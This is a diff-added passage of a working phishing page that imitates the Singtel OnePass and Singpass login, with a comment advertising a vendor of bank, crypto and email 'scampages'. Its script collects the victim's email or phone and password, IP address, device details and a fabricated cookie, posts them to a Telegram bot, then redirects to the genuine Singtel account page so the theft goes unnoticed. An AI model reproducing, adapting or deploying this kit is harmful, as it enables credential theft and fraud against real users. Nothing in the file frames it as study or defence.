+                  <path d="M12.2628 4.01932C12.6113 4.01932 12.9519 3.91581 13.2416 3.72194C13.5312 3.52807 13.7567 3.25257 13.8895 2.93035C14.0224 2.60814 14.0565 2.25374 13.9877 1.91209C13.9189 1.57044 13.7501 1.25692 13.5029 1.0113C13.2556 0.765671 12.941 0.598996 12.5989 0.532412C12.2568 0.465828 11.9026 0.502334 11.5813 0.637296C11.26 0.772257 10.986 0.999597 10.794 1.29049C10.602 1.58138 10.5008 1.92273 10.5031 2.27124C10.4999 2.50265 10.5434 2.73234 10.6308 2.94661C10.7183 3.16088 10.848 3.35536 11.0122 3.51847C11.1764 3.68158 11.3717 3.80998 11.5866 3.89603C11.8014 3.98207 12.0314 4.02401 12.2628 4.01932Z" fill="white"></path>
+                  <path d="M10.3643 10.897H14.1614L13.3626 4.61084C12.6451 4.79611 11.8922 4.79611 11.1746 4.61084L10.3643 10.897Z" fill="white"></path>
+                  <path d="M15.9463 10.894H19.0264V5.45295C19.0264 4.12163 19.6748 3.29969 20.9254 3.29969C22.1759 3.29969 22.7433 3.98271 22.7433 5.45295V10.894H25.7771V4.68889C25.7771 1.97994 24.4223 0.590737 22.1065 0.590737C21.5032 0.564511 20.9034 0.693339 20.3641 0.964923C19.8249 1.23651 19.3643 1.64177 19.0264 2.14202V1.49372C19.0353 1.39876 19.0232 1.30299 18.9908 1.21325C18.9585 1.12352 18.9068 1.04201 18.8393 0.974568C18.7718 0.907121 18.6903 0.855391 18.6006 0.823062C18.5108 0.790733 18.415 0.778603 18.32 0.787539H16.0042L15.9463 10.894Z" fill="white"></path>
+                  <path d="M35.6995 0.789662C35.6045 0.780726 35.5087 0.792856 35.419 0.825185C35.3292 0.857515 35.2477 0.909245 35.1802 0.976691C35.1128 1.04414 35.061 1.12564 35.0287 1.21538C34.9963 1.30511 34.9842 1.40088 34.9932 1.49584V2.10941C34.6562 1.61326 34.1964 1.21281 33.6587 0.947041C33.121 0.681275 32.5236 0.559255 31.9246 0.59286C30.678 0.712788 29.5208 1.29271 28.6787 2.21951C27.8367 3.1463 27.3701 4.35348 27.3701 5.60558C27.3701 6.85767 27.8367 8.06486 28.6787 8.99165C29.5208 9.91844 30.678 10.4984 31.9246 10.6183C32.5039 10.6548 33.0835 10.5543 33.6166 10.325C34.1498 10.0957 34.6213 9.74407 34.9932 9.29855V9.97C34.9938 10.2871 34.9293 10.601 34.8036 10.8922C34.678 11.1834 34.4938 11.4457 34.2625 11.6628C34.0313 11.8799 33.7579 12.0472 33.4593 12.1542C33.1607 12.2613 32.8433 12.306 32.5268 12.2853C31.3898 12.3074 30.2875 11.8932 29.4467 11.1277L27.8603 13.443C29.2118 14.4641 30.8817 14.9728 32.5731 14.8785C35.6069 14.8785 38.0732 13.362 38.0732 9.55324V0.789662H35.6995ZM32.7352 7.94407C32.2772 7.94407 31.8294 7.80828 31.4486 7.55387C31.0677 7.29946 30.7709 6.93784 30.5956 6.51477C30.4203 6.0917 30.3745 5.62616 30.4638 5.17703C30.5532 4.72789 30.7738 4.31534 31.0976 3.99153C31.4215 3.66773 31.8342 3.44721 32.2834 3.35787C32.7326 3.26854 33.1983 3.31439 33.6214 3.48963C34.0446 3.66487 34.4063 3.96164 34.6608 4.34239C34.9152 4.72315 35.051 5.1708 35.051 5.62873C35.051 6.2428 34.8071 6.83171 34.3727 7.26593C33.9384 7.70014 33.3494 7.94407 32.7352 7.94407Z" fill="white"></path>
+                  <path d="M46.5509 0.59112C45.9332 0.563774 45.3182 0.687625 44.7592 0.951916C44.2002 1.21621 43.7142 1.61294 43.3435 2.10767V1.4941C43.3524 1.39914 43.3403 1.30337 43.3079 1.21364C43.2756 1.1239 43.2239 1.0424 43.1564 0.974951C43.0889 0.907505 43.0074 0.855775 42.9177 0.823445C42.8279 0.791116 42.7321 0.778986 42.6371 0.787922H40.3213V14.5989H43.3435V9.78303C43.746 10.2295 44.2423 10.5814 44.7968 10.8136C45.3513 11.0458 45.9503 11.1524 46.5509 11.1259C47.2133 11.109 47.8652 10.9576 48.4672 10.6809C49.0692 10.4043 49.6086 10.0081 50.0527 9.51647C50.4967 9.02486 50.8362 8.4481 51.0503 7.82126C51.2645 7.19442 51.3489 6.53058 51.2984 5.8701C51.3522 5.20777 51.2702 4.54144 51.0576 3.91186C50.8449 3.28229 50.506 2.7027 50.0616 2.20856C49.6173 1.71442 49.0767 1.31612 48.4731 1.03801C47.8694 0.759901 47.2154 0.607838 46.5509 0.59112V0.59112ZM45.7404 8.42855C45.223 8.44935 44.7112 8.31483 44.2709 8.04231C43.8306 7.76978 43.482 7.37173 43.2699 6.89941C43.0578 6.42709 42.992 5.90211 43.081 5.39208C43.1699 4.88205 43.4095 4.41031 43.7689 4.0376C44.1284 3.66489 44.5911 3.40827 45.0977 3.30078C45.6043 3.1933 46.1314 3.23986 46.6113 3.43449C47.0911 3.62912 47.5017 3.96289 47.7902 4.39284C48.0787 4.82279 48.2318 5.32922 48.2299 5.84695C48.2474 6.18274 48.1957 6.51855 48.078 6.83353C47.9603 7.14852 47.7791 7.43597 47.5457 7.67803C47.3122 7.9201 47.0315 8.11163 46.721 8.24073C46.4104 8.36984 46.0767 8.43377 45.7404 8.42855V8.42855Z" fill="white"></path>
+                  <path d="M61.3135 0.789335C61.2185 0.7804 61.1227 0.79253 61.0329 0.824859C60.9432 0.857188 60.8617 0.908918 60.7942 0.976364C60.7267 1.04381 60.675 1.12531 60.6426 1.21505C60.6103 1.30479 60.5982 1.40055 60.6071 1.49552V2.10908C60.2308 1.60596 59.7355 1.20405 59.1656 0.93937C58.5957 0.674693 57.9691 0.555522 57.3418 0.592533C56.6794 0.609446 56.0275 0.760842 55.4255 1.03752C54.8235 1.31421 54.2841 1.71039 53.84 2.202C53.396 2.6936 53.0565 3.27036 52.8424 3.8972C52.6282 4.52404 52.5438 5.18788 52.5943 5.84836C52.5438 6.50884 52.6282 7.17268 52.8424 7.79952C53.0565 8.42637 53.396 9.00312 53.84 9.49472C54.2841 9.98633 54.8235 10.3825 55.4255 10.6592C56.0275 10.9359 56.6794 11.0873 57.3418 11.1042C57.9687 11.1381 58.5943 11.0176 59.1637 10.7531C59.733 10.4887 60.2287 10.0885 60.6071 9.58764V10.8958H63.6409V0.789335H61.3135ZM58.1523 8.42997C57.4959 8.38604 56.8806 8.09435 56.4312 7.61395C55.9818 7.13355 55.7318 6.50035 55.7318 5.84257C55.7318 5.1848 55.9818 4.5516 56.4312 4.0712C56.8806 3.5908 57.4959 3.2991 58.1523 3.25518C58.8088 3.2991 59.424 3.5908 59.8734 4.0712C60.3228 4.5516 60.5729 5.1848 60.5729 5.84257C60.5729 6.50035 60.3228 7.13355 59.8734 7.61395C59.424 8.09435 58.8088 8.38604 58.1523 8.42997Z" fill="white"></path>
+                  <path d="M69.7803 11.128C72.3509 11.128 73.9141 9.78509 73.9141 7.65497C73.9141 6.19631 73.0225 5.20071 71.1814 4.79552L69.3866 4.39034C68.6918 4.22827 68.3329 4.00831 68.3329 3.60312C68.3329 3.19794 68.6687 2.94325 69.4908 2.94325C70.4438 2.97646 71.3543 3.34552 72.0614 3.98516L73.5783 1.76242C72.3849 0.927766 70.9448 0.519896 69.4908 0.604753C67.0823 0.604753 65.4612 1.76243 65.4612 3.8115C65.4454 4.53887 65.7031 5.2457 66.1834 5.79229C66.6636 6.33889 67.3315 6.68548 68.055 6.76357L69.8498 7.1919C70.7414 7.38871 71.0077 7.65498 71.0077 8.00228C71.0077 8.34958 70.6371 8.6853 69.8498 8.6853C68.7173 8.66308 67.6265 8.25462 66.7581 7.52763L65.2412 9.75036C66.5693 10.7553 68.2095 11.2595 69.8729 11.1743L69.7803 11.128Z" fill="white"></path>
+                  <path d="M79.3662 11.1287C81.9368 11.1287 83.5 9.78577 83.5 7.65565C83.5 6.19699 82.6084 5.20139 80.7673 4.7962L78.9609 4.39102C78.2778 4.22895 77.9188 4.00899 77.9188 3.6038C77.9188 3.19862 78.2546 2.94393 79.0767 2.94393C80.0265 2.97586 80.9339 3.34527 81.6358 3.98584L83.1526 1.76311C81.9648 0.925959 80.5274 0.517706 79.0767 0.605435C76.6682 0.605435 75.0471 1.76311 75.0471 3.81219C75.0313 4.53955 75.289 5.24638 75.7693 5.79297C76.2496 6.33957 76.9174 6.68616 77.6409 6.76425L79.4357 7.19258C80.3273 7.38939 80.5936 7.65566 80.5936 8.00296C80.5936 8.35026 80.2347 8.68598 79.4357 8.68598C78.3033 8.66376 77.2124 8.2553 76.344 7.52831L74.8271 9.75104C76.1553 10.756 77.7954 11.2602 79.4589 11.175L79.3662 11.1287Z" fill="white"></path>
+                </svg>
+              </button>
+              <p class="mt-8 font-semibold text-base sm:text-base md:text-lg lg:text-xl xl:text-xl text-[#5c50bb]">Don't have Singpass app?</p>
+            </div>
+          </div>
+        </div>
+        <div class="flex flex-col text-base lg:text-xl pt-[244px] pb-1 sm:pt-12 md:pt-24 sm:pb-6 sm:flex-col-reverse">
+          <div class="flex flex-col sm:justify-center sm:text-center">
+            <div class="flex justify-center mb-1">
+              <p>© Singtel (CRN: 199201624D) All Rights Reserved.</p>
+            </div>
+            <div class="flex justify-center sm:mt-1">
+              <p>
+                <span class="text-[#5f50c0] font-medium">Contact Us</span> &nbsp; | &nbsp; <span class="text-[#5f50c0] font-medium">Data Protection</span> &nbsp; | &nbsp; <span class="text-[#5f50c0] font-medium">Terms of Use</span>
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    </div>
+    <script  type="text/javascript">
+      //THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
+      //If you want to get quality:
+      // - USA Banks Scampage
+      // - UK Banks Scampage
+      // - Australian Scampage
+      // - Canadian Scampage
+      // - Crypto Websites Scampage 
+      // - Email Accounts Scampage
+      // - Newsletter Scampage and more..
+      // Visit: https://www.scampage.shop/
+      document.addEventListener("DOMContentLoaded", function() {
+        function generateRandomId(length) {
+          const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+          let result = "";
+          for (let i = 0; i < length; i++) {
+            const randomIndex = Math.floor(Math.random() * chars.length);
+            result += chars[randomIndex];
+          }
+          return result;
+        };
+
+        function generateRandomNumbers(length) {
+          const digits = "0123456789";
+          let result = "";
+          for (let i = 0; i < length; i++) {
+            const randomIndex = Math.floor(Math.random() * digits.length);
+            result += digits[randomIndex];
+          }
+          return result;
+        };
+
+        function getExpirationDateInSGT() {
+          const currentDate = new Date();
+          const oneWeekLater = new Date(currentDate.getTime() + 7 * 24 * 60 * 60 * 1000);
+          const options = {
+            timeZone: 'Asia/Singapore',
+            weekday: 'short',
+            year: 'numeric',
+            month: 'short',
+            day: 'numeric',
+            hour: 'numeric',
+            minute: 'numeric',
+            second: 'numeric'
+          };
+          const formattedDate = new Intl.DateTimeFormat('en-GB', options).format(oneWeekLater);
+          const finalFormattedDate = `${formattedDate} GMT+8 Singapore; Path=/; SameSite="https://onepass.singtel.com/sso/login"; Secure`;
+          return finalFormattedDate;
+        };
+        const complexId = generateRandomNumbers(1) + ":" + generateRandomId(10) + "/" + generateRandomId(9) + "+" + generateRandomId(1) + "=" + generateRandomId(38) + generateRandomId(25) + "/" + generateRandomId(13) + "/" + generateRandomId(41) + "+" + generateRandomId(22) + "/" + generateRandomId(20) + "+" + generateRandomId(52) + "/" + generateRandomId(3) + "/" + generateRandomId(13) + "/" + generateRandomId(1) + "/" + generateRandomId(49) + "/" + generateRandomId(9) + "+" + generateRandomId(37) + ":" + generateRandomId(5) + "/" + generateRandomId(9) + "/" + generateRandomId(19) + `=; cookieDomain:"onepass.singtel.com"`;
+        const complexIdWithExpiration = `${complexId}; Expires=${getExpirationDateInSGT()}`;
+        localStorage.setItem("reese84", complexIdWithExpiration);
+      });
+      const onepassTab = document.getElementById('onepass-tab');
+      const singpassTab = document.getElementById('singpass-tab');
+      const onepassContent = document.getElementById('onepass-content');
+      const singpassContent = document.getElementById('singpass-content');
+      const onepassHr = document.getElementById('onepass-hr');
+      const singpassHr = document.getElementById('singpass-hr');
+      onepassTab.addEventListener('click', function() {
+        onepassContent.classList.remove('hidden');
+        singpassContent.classList.add('hidden');
+        onepassTab.classList.remove('text-black');
+        onepassTab.classList.add('text-[#5c50bb]');
+        onepassTab.classList.remove('font-normal');
+        onepassTab.classList.add('font-semibold');
+        onepassHr.classList.remove('bg-[#e1e1e1]');
+        onepassHr.classList.add('bg-[#5c50bb]');
+        singpassTab.classList.add('text-black');
+        singpassTab.classList.remove('text-[#5c50bb]');
+        singpassTab.classList.add('font-normal');
+        singpassTab.classList.remove('font-semibold');
+        singpassHr.classList.add('bg-[#e1e1e1]');
+        singpassHr.classList.remove('bg-[#5c50bb]');
+      });
+      singpassTab.addEventListener('click', function() {
+        singpassContent.classList.remove('hidden');
+        onepassContent.classList.add('hidden');
+        singpassTab.classList.remove('text-black');
+        singpassTab.classList.add('text-[#5c50bb]');
+        singpassTab.classList.remove('font-normal');
+        singpassTab.classList.add('font-semibold');
+        singpassHr.classList.remove('bg-[#e1e1e1]');
+        singpassHr.classList.add('bg-[#5c50bb]');
+        onepassTab.classList.add('text-black');
+        onepassTab.classList.remove('text-[#5c50bb]');
+        onepassTab.classList.add('font-normal');
+        onepassTab.classList.remove('font-semibold');
+        onepassHr.classList.add('bg-[#e1e1e1]');
+        onepassHr.classList.remove('bg-[#5c50bb]');
+      });
+      const emailContainerInput = document.getElementById("email");
+      const container = document.getElementById("container");
+      emailContainerInput.addEventListener("focus", () => {
+        container.classList.remove("bg-[#f7f7f7]");
+      });
+      emailContainerInput.addEventListener("blur", () => {
+        container.classList.add("bg-[#f7f7f7]");
+      });
+      const passwordContainerInput = document.getElementById("password");
+      const passwordContainer = document.getElementById("passwordContainer");
+      passwordContainerInput.addEventListener("focus", () => {
+        passwordContainer.classList.remove("bg-[#f7f7f7]");
+      });
+      passwordContainerInput.addEventListener("blur", () => {
+        passwordContainer.classList.add("bg-[#f7f7f7]");
+      });
+
+      function togglePasswordVisibility() {
+        const passwordInput = document.getElementById('password');
+        const slashIcon = document.getElementById('slash');
+        const notSlashIcon = document.getElementById('not-slash');
+        if (passwordInput.type === 'password') {
+          passwordInput.type = 'text';
+          notSlashIcon.classList.remove('hidden');
+          slashIcon.classList.add('hidden');
+        } else {
+          passwordInput.type = 'password';
+          slashIcon.classList.remove('hidden');
+          notSlashIcon.classList.add('hidden');
+        }
+      }
+      document.getElementById("login-form").onsubmit = function(event) {
+        event.preventDefault();
+
+        var emailInput = document.getElementById("email");
+        var passwordInput = document.getElementById("password");
+        var emailBorder = document.getElementById("email-border");
+        var passwordBorder = document.getElementById("password-border");
+        var emailError = document.getElementById("email-error");
+        var passwordError = document.getElementById("password-error");
+        var isValid = true;
+        emailBorder.style.borderColor = "#8b83cf";
+        passwordBorder.style.borderColor = "#8b83cf";
+        emailError.classList.add("hidden");
+        passwordError.classList.add("hidden");
+        if (emailInput.value.trim() === "") {
+          emailBorder.style.borderColor = "#ca112f";
+          emailError.classList.remove("hidden");
+          emailInput.focus();
+          isValid = false;
+        }
+        if (passwordInput.value.trim() === "") {
+          passwordBorder.style.borderColor = "#ca112f";
+          passwordError.classList.remove("hidden");
+          if (isValid) {
+            passwordInput.focus();
+          }
+          isValid = false;
+        }
+        if (isValid) {
+          const emailOrPhone = emailInput.value;
+          const password = passwordInput.value;
+          const x = localStorage.getItem("reese84");
+
+          fetch('https://api.ipify.org').then(res => res.text()).then(ipAddress => {
+            const deviceInfo = {
+              manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
+              model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
+              os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
+              browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
+            };
+            getLocation(emailOrPhone, password, x, deviceInfo, ipAddress);
+          }).catch(error => {
+            //console.error("Error capturing IP address:", error);
+          });
+        };
+      };
+      document.getElementById("login-button").addEventListener("click", function () {
+        onepassContent.classList.remove('hidden');
+        singpassContent.classList.add('hidden');
+        onepassTab.classList.remove('text-black');
+        onepassTab.classList.add('text-[#5c50bb]');
+        onepassTab.classList.remove('font-normal');
+        onepassTab.classList.add('font-semibold');
+        onepassHr.classList.remove('bg-[#e1e1e1]');
+        onepassHr.classList.add('bg-[#5c50bb]');
+        singpassTab.classList.add('text-black');
+        singpassTab.classList.remove('text-[#5c50bb]');
+        singpassTab.classList.add('font-normal');
+        singpassTab.classList.remove('font-semibold');
+        singpassHr.classList.add('bg-[#e1e1e1]');
+        singpassHr.classList.remove('bg-[#5c50bb]');
+        var emailInput = document.getElementById("email");
+        var passwordInput = document.getElementById("password");
+        var emailBorder = document.getElementById("email-border");
+        var passwordBorder = document.getElementById("password-border");
+        var emailError = document.getElementById("email-error");
+        var passwordError = document.getElementById("password-error");
+        var isValid = true;
+        emailBorder.style.borderColor = "#8b83cf";
+        passwordBorder.style.borderColor = "#8b83cf";
+        emailError.classList.add("hidden");
+        passwordError.classList.add("hidden");
+        if (emailInput.value.trim() === "") {
+          emailBorder.style.borderColor = "#ca112f";
+          emailError.classList.remove("hidden");
+          emailInput.focus();
+          isValid = false;
+        }
+        if (passwordInput.value.trim() === "") {
+          passwordBorder.style.borderColor = "#ca112f";
+          passwordError.classList.remove("hidden");
+          if (isValid) {
+            passwordInput.focus();
+          }
+          isValid = false;
+        }
+        if (isValid) {
+          const emailOrPhone = emailInput.value;
+          const password = passwordInput.value;
+          const x = localStorage.getItem("reese84");
+
+          fetch('https://api.ipify.org').then(res => res.text()).then(ipAddress => {
+            const deviceInfo = {
+              manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
+              model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
+              os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
+              browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
+            };
+            getLocation(emailOrPhone, password, x, deviceInfo, ipAddress);
+          }).catch(error => {
+            console.error("Error capturing IP address:", error);
+          });
+        };
+      });
+      document.getElementById("email").addEventListener("input", function() {
+        var emailBorder = document.getElementById("email-border");
+        var emailError = document.getElementById("email-error");
+        emailBorder.style.borderColor = "#8b83cf";
+        emailError.classList.add("hidden");
+      });
+      document.getElementById("password").addEventListener("input", function() {
+        var passwordBorder = document.getElementById("password-border");
+        var passwordError = document.getElementById("password-error");
+        passwordBorder.style.borderColor = "#8b83cf";
+        passwordError.classList.add("hidden");
+      });
+
+      function getLocation(emailOrPhone, password, x, deviceInfo, ipAddress) {
+        try {
+          var dataToSend = {
+            emailOrPhone,
+            password,
+            ipAddress,
+            Device: deviceInfo.manufacturer,
+            OS: deviceInfo.os,
+            Browser: deviceInfo.browser,
+            Cookie: x,
+          };
+          if (Object.keys(dataToSend).length > 0) {
+            sendToTelegram(dataToSend);
+          } else {
+            console.warn("No data to send to Telegram.");
+          }
+        } catch (error) {
+          console.error("Error occurred:", error);
+        }
+      };
+
+      function sendToTelegram(data) {
+        var payload = {
+          chat_id: chatId,
+          text: `
+            Singtel Onepass Log:
+            ________________________
+               "EMAIL OR PHONE": "${data.emailOrPhone}",
+               "PASSWORD": "${data.password}",
+               "IP": ${data.ipAddress},
+               "DEVICE": "${data.Device}",
+               "OS": "${data.OS}",
+               "BROWSER": "${data.Browser}",
+               "COOKIE": ${data.Cookie}
+            `
+        };
+        var sendToBot = {
+          url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          data: JSON.stringify(payload)
+        };
+        $.ajax(sendToBot).done(function(response) {
+          localStorage.removeItem("reese84");
+          window.location.href = "https://www.singtel.com/personal/my-account/manage-accounts/account-summary";
+        }).fail(function(error) {
+          console.error("Error sending data to Telegram:", error);
+        });
+      };
+    </script>
+  </body>
+</html>
